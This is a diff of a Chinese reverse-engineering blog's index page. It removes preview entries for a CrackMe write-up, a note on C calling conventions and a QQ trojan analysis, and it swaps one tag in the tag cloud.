-    <article id="post-爆破一个多线程E语言程序" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/10/20/爆破一个多线程E语言程序/">爆破一个多线程E语言程序</a>
-    </h1>
-  
-      
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>附件：<a href="/image/爆破一个多线程E语言程序/最后的CM.zip">最后的CM.zip</a></p>
-        <p class="article-more-link">
-          <a class="article-more-a"  href="/2016/10/20/爆破一个多线程E语言程序/#more">more >></a>
-        </p>
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      <a href="/2016/10/20/爆破一个多线程E语言程序/" class="archive-article-date">
-  	<time datetime="2016-10-20T13:57:17.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-10-20</time>
-</a>
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CrackMe/">CrackMe</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/逆向/">逆向</a></li></ul>
-	</div>
-
-      
-
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-C函数调用和堆栈" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/09/22/C函数调用和堆栈/">C函数调用和堆栈</a>
-    </h1>
-  
-      
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>函数传递参数有三种方式：堆栈方式、寄存器方式以及通过全局变量进行隐含参数的传递。如果参数是通过堆栈传递的，就需要定义参数在堆栈中的顺序，并约定函数被调用后，由谁来平衡堆栈。如果参数是通过寄存器传递的，就要确定参数存放在哪个寄存器中。</p>
-        <p class="article-more-link">
-          <a class="article-more-a"  href="/2016/09/22/C函数调用和堆栈/#more">more >></a>
-        </p>
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      <a href="/2016/09/22/C函数调用和堆栈/" class="archive-article-date">
-  	<time datetime="2016-09-22T08:22:08.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-09-22</time>
-</a>
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
-	</div>
-
-      
-
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-一个简单的QQ盗号木马分析" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/07/15/一个简单的QQ盗号木马分析/">一个简单的QQ盗号木马分析</a>
-    </h1>
-  
-      
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>附件：<a href="/image/一个简单的QQ盗号木马分析/xx.rar">样本</a><br>
-        <p class="article-more-link">
-          <a class="article-more-a"  href="/2016/07/15/一个简单的QQ盗号木马分析/#more">more >></a>
-        </p>
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      <a href="/2016/07/15/一个简单的QQ盗号木马分析/" class="archive-article-date">
-  	<time datetime="2016-07-15T09:31:41.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-07-15</time>
-</a>
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/病毒分析/">病毒分析</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/逆向/">逆向</a></li></ul>
 	</div>
 
       
@@ -752,7 +740,7 @@ var _hmt = _hmt || [];
     
     	<section class="tools-section tools-section-tag">
     			<div class="widget tagcloud" id="js-tagcloud">
-    				<a href="/tags/C/" style="font-size: 18.57px;">C</a> <a href="/tags/CrackMe/" style="font-size: 14.29px;">CrackMe</a> <a href="/tags/Hexo/" style="font-size: 11.43px;">Hexo</a> <a href="/tags/Linux/" style="font-size: 17.14px;">Linux</a> <a href="/tags/Windows/" style="font-size: 12.86px;">Windows</a> <a href="/tags/ctf/" style="font-size: 15.71px;">ctf</a> <a href="/tags/漏洞挖掘/" style="font-size: 18.57px;">漏洞挖掘</a> <a href="/tags/病毒分析/" style="font-size: 10px;">病毒分析</a> <a href="/tags/逆向/" style="font-size: 20px;">逆向</a>
+    				<a href="/tags/C/" style="font-size: 18.57px;">C</a> <a href="/tags/CrackMe/" style="font-size: 14.29px;">CrackMe</a> <a href="/tags/Hexo/" style="font-size: 11.43px;">Hexo</a> <a href="/tags/Linux/" style="font-size: 17.14px;">Linux</a> <a href="/tags/Windows/" style="font-size: 12.86px;">Windows</a> <a href="/tags/ctf/" style="font-size: 15.71px;">ctf</a> <a href="/tags/漏洞挖掘/" style="font-size: 18.57px;">漏洞挖掘</a> <a href="/tags/神经网络/" style="font-size: 10px;">神经网络</a> <a href="/tags/逆向/" style="font-size: 20px;">逆向</a>
     			</div>
     	</section>
     
